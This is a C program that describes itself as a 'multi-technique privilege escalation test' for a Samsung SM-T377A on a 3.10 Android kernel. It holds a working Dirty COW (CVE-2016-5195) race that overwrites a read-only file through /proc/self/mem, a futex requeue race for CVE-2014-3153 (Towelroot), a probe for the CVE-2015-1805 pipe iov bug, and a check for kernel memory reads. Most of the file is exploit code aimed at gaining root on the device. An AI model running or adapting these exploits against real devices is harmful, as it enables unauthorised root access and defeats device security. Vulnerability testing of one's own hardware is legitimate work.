/*
 * iov_root.c - Multi-technique Privilege Escalation Test
 * Samsung SM-T377A, kernel 3.10.9-11788437
 *
 * Tests: CVE-2015-1805 pipe iov, CVE-2016-5195 Dirty COW,
 *        addr_limit check, aggressive CVE-2014-3153 Towelroot
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <sched.h>

#define PAGE_SIZE 4096
#define SELINUX_ENFORCING 0xc0b7ad54

/* ============ Phase 0: addr_limit check ============ */
static int test_addr_limit(void) {
    printf("=== Phase 0: addr_limit Check ===\n");
    int fd = open("/proc/self/mem", O_RDONLY);
    if (fd < 0) { printf("  /proc/self/mem: %s\n", strerror(errno)); return 0; }
    char buf[4];
    off_t kaddr = 0xc0008000;
    if (lseek(fd, kaddr, SEEK_SET) == kaddr) {
        ssize_t ret = read(fd, buf, 4);
        if (ret == 4) {
            printf("  *** CAN READ KERNEL at 0x%lx! ***\n", (unsigned long)kaddr);
            close(fd); return 1;
        }
        printf("  Kernel read blocked (ret=%zd errno=%d)\n", ret, errno);
    }
    close(fd); return 0;
}

/* ============ Phase 1: CVE-2015-1805 pipe iov detection ============ */
static int test_pipe_iov(void) {
    printf("\n=== Phase 1: CVE-2015-1805 Detection ===\n");
    int pfd[2];
    char wbuf[PAGE_SIZE], rbuf[PAGE_SIZE];
    struct iovec iov[3];
    ssize_t ret;
    
    /* Create page with fault boundary */
    char *pages = mmap(NULL, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) { perror("mmap"); return -1; }
    munmap(pages + PAGE_SIZE, PAGE_SIZE); /* second page unmapped */
    
    for (int i = 0; i < PAGE_SIZE; i++) wbuf[i] = (char)(i & 0xFF);
    
    /* Test: readv crossing into unmapped page */
    pipe(pfd);
    write(pfd[1], wbuf, PAGE_SIZE);
    
    memset(rbuf, 0xCC, PAGE_SIZE);
    iov[0].iov_base = pages + PAGE_SIZE - 16;
    iov[0].iov_len = 32; /* 16 OK + 16 in fault zone */
    iov[1].iov_base = rbuf;
    iov[1].iov_len = PAGE_SIZE - 32;
    
    ret = readv(pfd[0], iov, 2);
    printf("  readv cross-boundary: %zd bytes\n", ret);
    
    if (ret > 0) {
        /* Check if iov[1] got wrong offset data (double-advance) */
        int correct = (rbuf[0] == wbuf[32]); /* should be offset 32 if normal */
        int from_0 = (rbuf[0] == wbuf[0]);
        int from_16 = (rbuf[0] == wbuf[16]);
        printf("  iov[1][0] = 0x%02x (expect 0x%02x for correct)\n",
               (unsigned char)rbuf[0], (unsigned char)wbuf[32]);
        if (correct) printf("  PATCHED: data at correct offset\n");
        else if (from_0 || from_16) {
            printf("  *** VULNERABLE: double-advance detected ***\n");
            close(pfd[0]); close(pfd[1]); munmap(pages, PAGE_SIZE);
            return 1;
        }
    } else if (ret == -1 && errno == EFAULT) {
        printf("  Got EFAULT — kernel handled fault correctly\n");
    } else if (ret == 16) {
        printf("  Partial read (16 bytes) — atomic copy failed, retry also failed\n");
        printf("  This is PATCHED behavior (proper retry handling)\n");
    }
    
    /* Test writev variant */
    close(pfd[0]); close(pfd[1]);
    pipe(pfd);
    
    char wdata[64];
    memset(wdata, 0x41, 64);
    iov[0].iov_base = pages + PAGE_SIZE - 8;
    iov[0].iov_len = 16; /* crosses boundary */
    iov[1].iov_base = wdata;
    iov[1].iov_len = 48;
    
    ret = writev(pfd[1], iov, 2);
    printf("  writev cross-boundary: %zd bytes\n", ret);
    
    if (ret > 8) {
        char check[64];
        ssize_t rr = read(pfd[0], check, ret);
        printf("  Readback %zd bytes, first after boundary: 0x%02x (expect 0x41)\n",
               rr, rr > 8 ? (unsigned char)check[8] : 0);
    }
    
    close(pfd[0]); close(pfd[1]);
    munmap(pages, PAGE_SIZE);
    printf("  Result: Likely PATCHED\n");
    return 0;
}

/* ============ Phase 2: Dirty COW (CVE-2016-5195) ============ */
static volatile int dcow_stop = 0;
static void *map_addr;

static void *dcow_madvise(void *arg) {
    while (!dcow_stop) {
        madvise(map_addr, PAGE_SIZE, MADV_DONTNEED);
        sched_yield();
    }
    return NULL;
}

static void *dcow_writer(void *arg) {
    int memfd = open("/proc/self/mem", O_RDWR);
    if (memfd < 0) return NULL;
    const char *payload = "DIRTYCOW_MODIFIED!";
    int len = strlen(payload);
    while (!dcow_stop) {
        lseek(memfd, (off_t)map_addr, SEEK_SET);
        write(memfd, payload, len);
        sched_yield();
    }
    close(memfd);
    return NULL;
}

static int test_dirty_cow(void) {
    printf("\n=== Phase 2: CVE-2016-5195 (Dirty COW) ===\n");
    const char *path = "/data/local/tmp/dcow_test";
    const char *orig = "ORIGINAL_UNTOUCHED!";
    int len = strlen(orig);
    
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { printf("  Cannot create test file\n"); return -1; }
    write(fd, orig, len);
    close(fd);
    chmod(path, 0444);
    
    fd = open(path, O_RDONLY);
    if (fd < 0) { printf("  Cannot open read-only\n"); return -1; }
    map_addr = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map_addr == MAP_FAILED) { close(fd); return -1; }
    printf("  Mapped at %p: %.19s\n", map_addr, (char *)map_addr);
    
    dcow_stop = 0;
    pthread_t t1, t2;
    pthread_create(&t1, NULL, dcow_madvise, NULL);
    pthread_create(&t2, NULL, dcow_writer, NULL);
    
    printf("  Racing for 5 seconds...\n");
    sleep(5);
    dcow_stop = 1;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    
    /* Check the underlying file */
    munmap(map_addr, PAGE_SIZE);
    close(fd);
    
    fd = open(path, O_RDONLY);
    char rb[64] = {0};
    read(fd, rb, len);
    close(fd);
    
    int vuln = (memcmp(rb, "DIRTYCOW_MODIFIED!", 18) == 0);
    printf("  File on disk: %s\n", rb);
    printf("  *** Dirty COW: %s ***\n", vuln ? "VULNERABLE!" : "PATCHED");
    
    chmod(path, 0644);
    unlink(path);
    return vuln;
}

/* ============ Phase 3: Aggressive Towelroot ============ */
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7

static int futex_op(int *u, int op, int val, const struct timespec *t, int *u2, int v3) {
    return syscall(SYS_futex, u, op, val, t, u2, v3);
}

static volatile int race_found = 0;
static int futex1_tr, futex2_tr;

struct tr_args { int timeout_ns; };

static void *tr_waiter(void *arg) {
    struct tr_args *a = (struct tr_args *)arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_nsec += a->timeout_ns;
    while (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }
    
    futex1_tr = 0;
    int ret = futex_op(&futex1_tr, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &futex2_tr, 0);
    if (ret == 0) {
        int u = futex_op(&futex2_tr, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        if (u != 0) race_found = 1;
    }
    return NULL;
}

static void *tr_requeuer(void *arg) {
    struct tr_args *a = (struct tr_args *)arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    struct timespec d = {0, a->timeout_ns / 3};
    nanosleep(&d, NULL);
    
    futex2_tr = 0;
    futex_op(&futex2_tr, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    futex_op(&futex1_tr, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &futex2_tr, 0);
    futex_op(&futex2_tr, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

static int test_towelroot(void) {
    printf("\n=== Phase 3: CVE-2014-3153 Aggressive Race ===\n");
    
    int timeouts[] = {500, 1000, 2000, 5000, 10000, 50000, 100000, 500000};
    int nt = sizeof(timeouts) / sizeof(timeouts[0]);
    int total = 0;
    
    for (int t = 0; t < nt && !race_found; t++) {
        int iters = 1000;
        printf("  timeout=%d ns: ", timeouts[t]);
        fflush(stdout);
        
        for (int i = 0; i < iters && !race_found; i++) {
            pthread_t tw, tr;
            struct tr_args args = {timeouts[t]};
            futex1_tr = 0; futex2_tr = 0;
            
            pthread_create(&tw, NULL, tr_waiter, &args);
            pthread_create(&tr, NULL, tr_requeuer, &args);
            pthread_join(tw, NULL);
            pthread_join(tr, NULL);
            total++;
        }
        printf("%s (%d total)\n", race_found ? "FOUND!" : "0 anomalies", total);
    }
    
    printf("  Result: %s after %d iterations\n",
           race_found ? "*** RACE WON ***" : "No anomalies", total);
    return race_found;
}

int main(void) {
    printf("=== iov_root: Multi-technique Privesc Test ===\n");
    printf("UID=%d EUID=%d\n\n", getuid(), geteuid());
    
    int r0 = test_addr_limit();
    int r1 = test_pipe_iov();
    int r2 = test_dirty_cow();
    int r3 = 0;
    if (!r0 && !r1 && !r2) r3 = test_towelroot();
    
    printf("\n=== RESULTS ===\n");
    printf("  addr_limit bypass: %s\n", r0 ? "YES" : "no");
    printf("  CVE-2015-1805 (pipe): %s\n", r1 > 0 ? "VULNERABLE" : "not detected");
    printf("  CVE-2016-5195 (DirtyCOW): %s\n", r2 > 0 ? "VULNERABLE" : "not detected");
    printf("  CVE-2014-3153 (Towelroot): %s\n", r3 ? "RACE WON" : "not detected");
    
    return 0;
}
